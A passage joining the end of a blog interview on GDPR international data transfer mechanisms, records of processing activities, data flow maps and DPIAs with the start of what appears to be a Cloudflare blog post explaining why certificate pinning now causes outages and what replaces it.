&lt;p&gt;When dealing with a situation like that, you need to find a workaround – for example, publish a statement your website like: ‘Please be aware that you might want to change your password at your earliest opportunity.’&lt;/p&gt;



&lt;p&gt;It’s not ideal, but it makes the best of an awkward situation. It’s taking a risk-based approach to compliance.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-4"&gt;Mechanism #4: Codes of conduct&lt;/h2&gt;



&lt;p&gt;Under Article 40 of both GDPRs, organisations can rely on approved &lt;strong&gt;codes of conduct&lt;/strong&gt; to transfer data internationally. However, the UK doesn’t currently have any, so can’t use them.&lt;/p&gt;



&lt;p&gt;The EU, on the other hand, has multiple Article 40 codes of conduct available for certain types of data processing, within certain third countries.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-5"&gt;Mechanism #5: Certification&lt;/h2&gt;



&lt;p&gt;Another provision under Article 42 of both GDPRs is &lt;strong&gt;certification&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;The UK has several certification schemes. However, the only one approved under Article 42 that can also be used for international transfers is &lt;a href="https://ico.org.uk/for-organisations/advice-and-services/certification-schemes/certification-scheme-register/adisa-ict-asset-recovery-certification-80/" rel="noreferrer noopener" target="_blank"&gt;ADISA ICT Asset Recovery Certification 8.0&lt;/a&gt;. Furthermore, this scheme is only available to processors or sub-processors providing data sanitisation services.&lt;/p&gt;



&lt;p&gt;The EU GDPR currently has &lt;a href="https://www.itgovernance.co.uk/europrivacy" rel="noreferrer noopener" target="_blank"&gt;Europrivacy&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt;&lt;sup&gt;/&lt;/sup&gt;®&lt;/a&gt;, but this certification mechanism currently doesn’t account for international transfers, and can’t be used outside the EU or EEA.&lt;/p&gt;



&lt;p&gt;However, Europrivacy is currently being extended to meet the Article 46(2)(f) requirements of the EU GDPR as an approved mechanism for international transfers.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-6"&gt;Mechanism #6: International data transfer derogations&lt;/h2&gt;



&lt;p&gt;Article 49 of the UK and EU GDPR allow “&lt;strong&gt;derogations for specific situations&lt;/strong&gt;”. You should only rely on this mechanism if you can’t rely on any of the above.&lt;/p&gt;



&lt;p&gt;The derogations permit you to make restricted transfers if:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The data subject has explicitly consented;&lt;/li&gt;



&lt;li&gt;The transfer is necessary to perform a contract;&lt;/li&gt;



&lt;li&gt;The transfer is necessary to protect someone’s vital interests;&lt;/li&gt;



&lt;li&gt;The transfer is necessary for “important reasons of public interest”;&lt;/li&gt;



&lt;li&gt;The transfer is necessary to establish, exercise or defend legal claims; or&lt;/li&gt;



&lt;li&gt;You’re making the transfer from a register intended to provide information to the public.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;These types of transfers should be infrequent and concern a limited number of data subjects.&lt;/p&gt;



&lt;p&gt;Also, if you rely on a derogation, make sure you record (in your &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;Article 30 ROPAs&lt;/a&gt;) the safeguards you’ve put in place for the data transfer.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-7"&gt;Mechanism #7: Compelling legitimate interest&lt;/h2&gt;



&lt;p&gt;The final mechanism is &lt;strong&gt;compelling legitimate interests&lt;/strong&gt;. Specifically, both Regulations say in Article 49(1)(g):&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;[The international transfer] is necessary for the purposes of compelling legitimate interests pursued by the controller which are not overridden by the interests or rights and freedoms of the data subject, and the controller has assessed all the circumstances surrounding the data transfer and has on the basis of that assessment provided suitable safeguards with regard to the protection of personal data.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;As is standard with legitimate interests, you must inform the data subject of that interest, as well the international transfer. You must also inform your supervisory authority.&lt;/p&gt;



&lt;p&gt;Unlike the &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; legitimate interests, there’s no assessment for this. However, you must keep records that show your decision-making process around what the legitimate interest was, why you deemed this the appropriate transfer method, that you’ve informed your data subjects, etc.&lt;/p&gt;



&lt;p&gt;Like the derogations, this mechanism should be used in moderation.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="how-to-choose"&gt;How to choose the right mechanism&lt;/h2&gt;



&lt;p&gt;Seven mechanisms, with variations between the UK and EU GDPR, can feel overwhelming.&lt;/p&gt;



&lt;p&gt;The good news is that those differences are minor, as both GDPRs share the same principles. Moreover, the bulk of personal data transfers are covered by the first three mechanisms:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Adequacy&lt;/li&gt;



&lt;li&gt;IDTA/SCCs&lt;/li&gt;



&lt;li&gt;BCRs&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Between these three, the correct mechanism is often fairly obvious.&lt;/p&gt;



&lt;p&gt;In short, rely on adequacy if you can. If you can’t, use the BCRs if you’re an international organisation; otherwise, use the IDTA (UK GDPR) or SCCs (EU GDPR).&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Records-of-processing-activities"&gt;Records of processing activities&lt;/h2&gt;



&lt;p&gt;&lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;Previously&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;, we discussed ROPAs. One practical tip you gave was to first list all&lt;/strong&gt; &lt;strong&gt;processing activities before adding lots of data points.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Another tip was to consider your ROPA a ‘one-stop shop’ – having all your information in one place. Could you elaborate?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;ROPAs are a single place for you to understand your processing activities. And not just you – other stakeholders, too.&lt;/p&gt;



&lt;p&gt;Suppose that the ICO [Information Commissioner’s Office] audits you. The first thing the regulator will likely ask for are your Article 30 ROPAs. If the ICO then wants to know, say, what &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; you’re relying on, they should be able to see it right there, in that ROPA.&lt;/p&gt;



&lt;p&gt;Your ROPA should already have a column for lawful basis. Plus, if that lawful basis is legitimate interests, you could then add columns for:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;A brief outline of that legitimate interest; and&lt;/li&gt;



&lt;li&gt;A hyperlink to your LIA [legitimate interests assessment], proving the validity of that legitimate interest.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;On the other hand, if your lawful basis is consent, you could also have a column that hyperlinks to evidence of that consent:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;When and how did the data subject give their consent?&lt;/li&gt;



&lt;li&gt;What information did you give them at the time?&lt;/li&gt;



&lt;li&gt;What &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-managing-the-right-to-withdraw-consent" rel="noreferrer noopener" target="_blank"&gt;withdrawal mechanism&lt;/a&gt; do you use?&lt;/li&gt;



&lt;li&gt;And so on.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The ROPA is a high-level summary that should provide an immediate overview of:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;All your processing activities; and&lt;/li&gt;



&lt;li&gt;All the risks associated with them.&lt;/li&gt;
&lt;/ul&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What sort of risks are you referring to here? And how can a ROPA give an overview of them?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;The risks the GDPR always focuses on – risks to the rights and freedoms of data subjects.&lt;/p&gt;



&lt;p&gt;As to how a ROPA provides an overview – you should have columns that indicate:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;How you’re processing and securing the personal data, using appropriate &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-article-32-your-guide-to-the-requirements" rel="noreferrer noopener" target="_blank"&gt;technical and organisational measures&lt;/a&gt;;&lt;/li&gt;



&lt;li&gt;What Article 6 lawful basis you’re relying on and, for &lt;a href="https://www.itgovernance.co.uk/blog/the-gdpr-do-you-know-the-difference-between-personal-data-and-sensitive-data" rel="noreferrer noopener" target="_blank"&gt;special category data&lt;/a&gt;, Article 9 exemption;&lt;/li&gt;



&lt;li&gt;How you’re meeting the Article 5 data protection principles;&lt;/li&gt;



&lt;li&gt;What data subject rights are applicable;&lt;/li&gt;



&lt;li&gt;Whether international transfers are taking place, what mechanism you’re relying on to legally transfer personal data to a third country, and how you’re securing those transfers; and&lt;/li&gt;



&lt;li&gt;The level of risk of the processing activity, and if the risk is high, that you’ve performed a DPIA, with a link to that assessment.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The GDPR doesn’t require you to include all this in your ROPA, but this list &lt;em&gt;does&lt;/em&gt; reflect the Regulation’s requirements, and it provides a convenient means of showing that you’re complying with them.&lt;/p&gt;



&lt;p&gt;Collecting this data in your ROPA also gives a simple, clear overview of these data points, which in turn gives you a much clearer picture of your risks.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Data-flow-mapping"&gt;Data flow mapping&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Let’s dig into what you said about “how you’re processing and securing the personal data”. What would that look like in a ROPA?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;You’d have a group of columns in your ROPA that look something like this:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-46670" height="209" src="https://www.itgovernance.co.uk/blog/wp-content/uploads/2024/08/image-5.png" width="938" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;You can also add columns for implemented security measures, including information on encryption. For instance, you might have a drop-down menu with items like:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Pseudonymisation&lt;/li&gt;



&lt;li&gt;Anonymisation&lt;/li&gt;



&lt;li&gt;Encryption&lt;/li&gt;



&lt;li&gt;Plaintext&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;You could also add details on the specific encryption protocol, particularly if your organisation uses more than one.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;And you then feed this information into a data flow map?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Correct, but a data flow map also takes things further. It &lt;em&gt;visualises&lt;/em&gt; the data flows, so you can easily see:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Which departments are using what data; and&lt;/li&gt;



&lt;li&gt;The risks your data might be subject to.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;For example, if your data flow map shows you’re storing a lot of personal data in &lt;a href="https://www.itgovernance.co.uk/blog/the-14-cloud-security-principles-explained" rel="noreferrer noopener" target="_blank"&gt;Cloud&lt;/a&gt;-based databases, have you implemented appropriate &lt;a href="https://www.itgovernance.co.uk/blog/what-is-access-control" rel="noreferrer noopener" target="_blank"&gt;access control&lt;/a&gt;?&lt;/p&gt;



&lt;p&gt;The nature of the Cloud is that you can access it from anywhere with an Internet connection, so restricting access is vital, particularly if staff work remotely. If your employees are also based &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;internationally&lt;/a&gt;, ensure you’re meeting local laws as well as the UK GDPR requirements.&lt;/p&gt;



&lt;p&gt;Another thing to pay attention to is configurations – you really don’t want to inadvertently make your database publicly available, so did you configure it properly?&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;So, your data flow maps help organisations secure their personal data?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Yes. Because data flow maps show you where you’re storing, processing and transmitting personal data, they give a clear idea of where your security risks are. And&lt;/p&gt;



&lt;p&gt;They also clearly show who’s using the data, and that tells you who to talk to in order to better understand and address those risks. This mapping exercise will highlight data you might be collecting but not using, in which case you should destroy it to:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Meet your GDPR requirements [e.g. the &lt;a href="https://www.itgovernance.co.uk/blog/what-is-data-minimisation-definition-examples" rel="noreferrer noopener" target="_blank"&gt;data minimisation&lt;/a&gt; principle];&lt;/li&gt;



&lt;li&gt;Reduce the risks [the impact of a data breach]; and&lt;/li&gt;



&lt;li&gt;Save you money [storage costs].&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 class="wp-block-heading" id="Data-protection-impact-assessment"&gt;Data protection impact assessment&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;You &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;previously&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; suggested using ROPAs in conjunction with tools like DPIAs, and that  detailed ROPAs  help you conduct DPIAs and &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/blog/why-risk-assessments-are-essential-for-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;risk assessments&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; further down the line. Could you elaborate?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;I see all three – ROPAs, data flow maps and DPIAs – as tools to help you understand your processing activities.&lt;/p&gt;



&lt;p&gt;I don’t look at the ROPAs in isolation: all &amp;nbsp;three &amp;nbsp;together enable you to demonstrate accountability and compliance with Article 30.&lt;/p&gt;



&lt;p&gt;But the &lt;em&gt;focus&lt;/em&gt; of each tool is different, of course. For instance, DPIAs revolve around risk – the idea is that you only need to conduct a DPIA if the processing presents a&amp;nbsp;&lt;em&gt;high&lt;/em&gt;&amp;nbsp;risk to the rights and freedoms of data subjects.* Which you then look to address, to reduce that risk to an acceptable level.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;*It’s also worth checking Article 35(3) of the GDPR for specific examples that constitute high-risk processing, as well as the&amp;nbsp;&lt;/em&gt;&lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/accountability-and-governance/data-protection-impact-assessments-dpias/examples-of-processing-likely-to-result-in-high-risk/" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;list of examples&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&amp;nbsp;on the ICO website and the&amp;nbsp;&lt;/em&gt;&lt;a href="https://ec.europa.eu/newsroom/article29/items/611236" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;Article 29 Working Party guidelines&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&amp;nbsp;(endorsed by the EDPB).&lt;/em&gt;&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;How can organisations track their risks?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Specific to risks relevant to the GDPR, again, you can create a group of columns in your ROPA to track key data points. If you don’t feel comfortable with spreadsheets, an automation tool can help by providing a template that you work within. In a spreadsheet, this might look something like this:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-46668" height="193" src="https://www.itgovernance.co.uk/blog/wp-content/uploads/2024/08/image-3.png" width="939" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;Depending on your needs, you may want to use slightly different columns, but I recommend tracking your risks in your ROPAs, as this takes advantage of the fact you’ve listed out all your processing activities. In effect, those records are your &lt;strong&gt;asset register&lt;/strong&gt; – a key element to an asset-based risk assessment, which is a skill that’s fundamental to data protection, privacy and information security management&lt;/p&gt;



&lt;p&gt;You can further simplify things by colour-coding your risks to highlight those that require further action. You can also use Excel formulas to automate certain columns, or even use &lt;a href="https://www.itgovernance.co.uk/cybercomply" rel="noreferrer noopener" target="_blank"&gt;dedicated software&lt;/a&gt; to fully automate the process and save you a lot of time, as well as the risk of not saving your work and having to start all over again.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;h2 class="wp-block-heading" id="Bringing-together-ROPAs-data-flow-mapping-and-DPIAs"&gt;Bringing together ROPAs, data flow mapping and DPIAs&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Let’s wrap things up. Where do organisations begin with GDPR compliance?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;With their ROPAs. If you don’t have a clear overview of your processing activities, it becomes virtually impossible to meet your other legal requirements.&lt;/p&gt;



&lt;p&gt;It’s akin to implementing cyber security without a &lt;a href="https://www.itgovernance.co.uk/shop/product/information-security-risk-assessment-workshop" rel="noreferrer noopener" target="_blank"&gt;risk assessment&lt;/a&gt; – if you don’t know what your threats and vulnerabilities are, you can’t implement cyber defences effectively.&lt;/p&gt;



&lt;p&gt;Compiling your ROPAs tells you what personal data you’re processing, along with how, why, when and by whom. Just those basics make for a decent start to compliance.&lt;/p&gt;



&lt;p&gt;In time, you can add columns and data points not listed in Article 30 but that&amp;nbsp;&lt;em&gt;are&lt;/em&gt;&amp;nbsp;mentioned elsewhere in the GDPR. If creating your ROPAs is becoming complex, there are guides, software and consultancy that can support this project. &amp;nbsp;You can also reflect good practice, for example by including data flow maps. These include information about DPIAs, as well as information about lawful basis, applicable data subject rights, and so on. Take GDPR compliance one step at a time, using your ROPAs as your base.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

Learn why certificate pinning hasn’t kept up with modern standards and find alternatives to improve security while reducing management overhead</description><content:encoded>&lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/53OxQEDIwH8W1WEf7Gpeej/750904f31665823959ba414038bb154a/image1-11.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;In today’s world, technology is quickly evolving and some practices that were once considered the gold standard are quickly becoming outdated. At Cloudflare, we stay close to industry changes to ensure that we can provide the best solutions to our customers. One practice that we’re continuing to see in use that no longer serves its original purpose is certificate pinning. In this post, we’ll dive into certificate pinning, the consequences of using it in today’s &lt;a href="https://www.cloudflare.com/en-gb/learning/ssl/how-does-public-key-encryption-work/"&gt;Public Key Infrastructure (PKI)&lt;/a&gt; world, and alternatives to pinning that offer the same level of security without the management overhead.  &lt;/p&gt;&lt;p&gt;PKI exists to help issue and manage &lt;a href="https://www.cloudflare.com/learning/ssl/what-is-an-ssl-certificate/"&gt;TLS certificates&lt;/a&gt;, which are vital to keeping the Internet secure – they ensure that users access the correct applications or servers and that data between two parties stays encrypted. The mis-issuance of a certificate can pose great risk. For example, if a malicious party is able to issue a TLS certificate for your bank’s website, then they can potentially impersonate your bank and intercept that traffic to get access to your bank account. To prevent a mis-issued certificate from intercepting traffic, the server can give a certificate to the client and say “only trust connections if you see this certificate and drop any responses that present a different certificate” – this practice is called certificate pinning.&lt;/p&gt;&lt;p&gt;In the early 2000s, it was common for banks and other organizations that handle sensitive data to pin certificates to clients. However, over the last 20 years, TLS certificate issuance has evolved and changed, and new solutions have been developed to help customers achieve the security benefit they receive through certificate pinning, with simpler management, and without the risk of disruption.&lt;/p&gt;&lt;p&gt;Cloudflare’s mission is to help build a better Internet, which is why our teams are always focused on &lt;a href="https://www.cloudflare.com/application-services/solutions/domain-protection-services/"&gt;keeping domains secure and online&lt;/a&gt;.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Why certificate pinning is causing more outages now than it did before&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-certificate-pinning-is-causing-more-outages-now-than-it-did-before"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Certificate pinning is not a new practice, so why are we emphasizing the need to stop using it &lt;i&gt;now&lt;/i&gt;? The reason is that the PKI ecosystem is moving towards becoming more agile, flexible, and secure. As a part of this change, &lt;a href="https://www.ssl.com/article/what-is-a-certificate-authority-ca/"&gt;certificate authorities (CAs)&lt;/a&gt; are starting to rotate certificates and their intermediates, certificates that bridge the root certificate and the domain certificate, more frequently to improve security and encourage automation.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6bcPbw10tESD1qHK6cP9yE/ac3f3df18f10a8a4595386a49a7ecd07/image3-12.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;These more frequent certificate rotations are problematic from a pinning perspective because certificate pinning relies on the exact matching of certificates. When a certificate is rotated, the new certificate might not match the pinned certificate on the client side. If the pinned certificate is not updated to reflect the contents of the rotated certificate, the client will reject the new certificate, even if it’s valid and issued by the same CA. This mismatch leads to a failure in establishing a secure connection, causing the domain or application to become inaccessible until the pinned certificate is updated.&lt;/p&gt;&lt;p&gt;Since the start of 2024, we have seen the number of customer reported outages caused by certificate pinning significantly increase. (As of this writing, we are part way through July and Q3 has already seen as many outages as the last three quarters of 2023 combined.)&lt;/p&gt;

            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1U4AFw29oL1GCcen93rnYr/5dea495d82170011725de472cfd7f98a/image4-4.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;We can attribute this rise to two major events: Cloudflare migrating away from using DigiCert as a certificate authority and Google and Let’s Encrypt intermediate CA rotations.&lt;/p&gt;&lt;p&gt;Before migrating customer’s certificates away from using DigiCert as the CA, Cloudflare sent multiple notifications to customers to inform them that they should update or remove their certificate pins, so that the migration does not impact their domain’s availability.&lt;/p&gt;&lt;p&gt;However, what we’ve learned is that almost all customers that were impacted by the change were unaware that they had a certificate pin in place. One of the consequences of using certificate pinning is that the “set and forget” mentality doesn’t work, now that certificates are being rotated more frequently. Instead, changes need to be closely monitored to ensure that a regular certificate renewal doesn't cause an outage. This goes to show that to implement certificate pinning successfully, customers need a robust system in place to track certificate changes and implement them.&lt;/p&gt;&lt;p&gt;We built our &lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/universal-ssl/"&gt;Universal SSL&lt;/a&gt; pipeline to be resilient and redundant, ensuring that we can always issue and renew a TLS certificate on behalf of our customers, &lt;a href="https://blog.cloudflare.com/introducing-backup-certificates"&gt;even in the event of a compromise or revocation&lt;/a&gt;. CAs are starting to make changes like more frequent certificate rotations to encourage a move towards a more secure ecosystem. Now, it’s up to domain owners to stop implementing legacy practices like certificate pinning, which cause breaking changes, and instead start adopting modern standards that aim to provide the same level of security, but without the management overhead or risk.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Modern standards &amp;amp; practices are making the need for certificate pinning obsolete&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#modern-standards-practices-are-making-the-need-for-certificate-pinning-obsolete"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          
          &lt;div&gt;
            &lt;h3&gt;Shorter certificate lifetimes&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#shorter-certificate-lifetimes"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Over the last few years, we have seen certificate lifetimes quickly decrease. Before 2011, a certificate could be valid for up to 96 months (eight years) and now, in 2024, the maximum validity period for a certificate is 1 year. We’re seeing this trend continue to develop, with Google Chrome &lt;a href="https://www.chromium.org/Home/chromium-security/root-ca-policy/moving-forward-together/"&gt;pushing&lt;/a&gt; for shorter CA, intermediate, and certificate lifetimes, advocating for 3 month certificate validity as the new standard.&lt;/p&gt;&lt;p&gt;This push improves security and redundancy of the entire PKI ecosystem in several ways. First, it reduces the scope of a compromise by limiting the amount of time that a malicious party could control a TLS certificate or private key. Second, it reduces reliance on certificate revocation, a process that lacks standardization and enforcement by clients, browsers, and CAs. Lastly, it encourages automation as a replacement for legacy certificate practices that are time-consuming and error-prone.&lt;/p&gt;&lt;p&gt;Cloudflare is moving towards only using CAs that follow the &lt;a href="https://datatracker.ietf.org/doc/html/rfc8555"&gt;ACME&lt;/a&gt; (Automated Certificate Management Environment) protocol, which by default, issues certificates with 90 day validity periods. We have already started to roll this out to Universal SSL certificates and have removed the ability to issue 1-year certificates as a part of our &lt;a href="https://developers.cloudflare.com/ssl/reference/migration-guides/digicert-update/"&gt;reduced usage of DigiCert&lt;/a&gt;.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Regular rotation of intermediate certificates&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#regular-rotation-of-intermediate-certificates"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/38pDF476Nnjx7acXBN5eTM/ece6376485bb5232e4574d05c7294564/image2-8.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;The CAs that Cloudflare partners with, &lt;a href="https://letsencrypt.org/"&gt;Let’s Encrypt&lt;/a&gt; and &lt;a href="https://pki.goog/"&gt;Google Trust Services&lt;/a&gt;, are starting to rotate their intermediate CAs more frequently. This increased rotation is beneficial from a security perspective because it limits the lifespan of intermediate certificates, reducing the window of opportunity for attackers to exploit a compromised intermediate. Additionally, regular rotations make it easier to revoke an intermediate certificate if it becomes compromised, enhancing the overall security and resiliency of the PKI ecosystem.&lt;/p&gt;&lt;p&gt;Both Let’s Encrypt and Google Trust Services changed their intermediate chains in June 2024. In addition, &lt;a href="https://community.letsencrypt.org/t/lets-encrypt-new-intermediate-certificates/209498"&gt;Let’s Encrypt has started to balance their certificate issuance across 10 intermediates&lt;/a&gt; (5 RSA and 5 ECDSA).&lt;/p&gt;&lt;p&gt;Cloudflare customers using &lt;a href="https://www.cloudflare.com/advanced-certificate-manager/"&gt;Advanced Certificate Manager&lt;/a&gt; have the ability to choose their issuing CA. The issue is that even if Cloudflare uses the same CA for a certificate renewal, there is no guarantee that the same certificate chain (root or intermediate) will be used to issue the renewed certificate. As a result, if pinning is used, a successful renewal could cause a full outage for a domain or application.&lt;/p&gt;&lt;p&gt;This happens because certificate pinning relies on the exact matching of certificates. When an intermediate certificate is rotated or changed, the new certificate might not match the pinned certificate on the client side. As a result, the client will reject the renewed certificate, even if it’s a valid certificate issued by the same CA. This mismatch leads to a failure on the client side, causing the domain to become inaccessible until the pinned certificate is updated to reflect the new intermediate certificate. This risk of an unexpected outage is a major downside of continuing to use certificate pinning, especially as CAs increasingly update their intermediates as a security measure.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Increased use of certificate transparency&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#increased-use-of-certificate-transparency"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;&lt;a href="https://blog.cloudflare.com/introducing-certificate-transparency-and-nimbus"&gt;Certificate transparency (CT) logs&lt;/a&gt; provide a standardized framework for monitoring and auditing the issuance of TLS certificates. CT logs help detect misissued or malicious certificates and Cloudflare customers can set up &lt;a href="https://blog.cloudflare.com/introducing-certificate-transparency-monitoring"&gt;CT monitoring&lt;/a&gt; to receive notifications about any certificates issued for their domain. This provides a better mechanism for detecting certificate mis-issuance, reducing the need for pinning.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Why modern standards make certificate pinning obsolete&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-modern-standards-make-certificate-pinning-obsolete"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Together, these practices – shorter certificate lifetimes, regular rotations of intermediate certificates, and increased use of certificate transparency – address the core security concerns that certificate pinning was initially designed to mitigate. Shorter lifetimes and frequent rotations limit the impact of compromised certificates, while certificate transparency allows for real time monitoring and detection of misissued certificates. These advancements are automated, scalable, and robust and eliminate the need for the manual and error-prone process of certificate pinning. By adopting these modern standards, organizations can achieve a higher level of security and resiliency without the management overhead and risk associated with certificate pinning.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Reasons behind continued use of certificate pinning&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#reasons-behind-continued-use-of-certificate-pinning"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
